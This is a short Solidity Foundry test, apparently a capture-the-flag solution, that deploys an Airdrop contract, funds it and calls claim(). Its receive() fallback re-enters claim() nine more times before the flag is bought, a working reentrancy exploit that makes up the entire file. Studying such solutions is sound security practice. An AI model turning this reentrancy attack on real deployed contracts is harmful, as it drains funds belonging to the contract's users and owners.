// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {Airdrop} from "src/Airdrop.sol";

contract Solve is Test {
    uint256 cnt;
    Airdrop airdrop;

    function test() public {
        airdrop = new Airdrop();
        payable(address(airdrop)).transfer(1 ether);
        airdrop.airdrop();
        airdrop.claim();
        console.log("claimed : ", airdrop.claimed(address(this)));
        airdrop.buyFlag(address(this));
        console.log(airdrop.flag(address(this)));
    }

    receive() external payable {
        if (cnt != 9) {
            cnt++;
            airdrop.claim();
        }
    }
}
